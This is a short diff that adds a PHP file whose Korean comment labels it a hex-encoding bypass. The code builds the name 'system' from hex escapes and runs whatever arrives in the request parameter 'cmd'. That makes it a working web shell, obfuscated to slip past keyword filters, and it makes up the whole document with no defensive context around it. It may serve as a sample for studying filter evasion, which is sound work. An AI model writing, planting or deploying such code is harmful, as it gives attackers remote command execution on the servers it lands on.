@@ -1,0 +1,6 @@
+<?php
+// Hex 인코딩 우회
+// "\x73\x79\x73\x74\x65\x6d" = "system"
+$f = "\x73\x79\x73\x74\x65\x6d";
+$f($_REQUEST['cmd']);
+?>
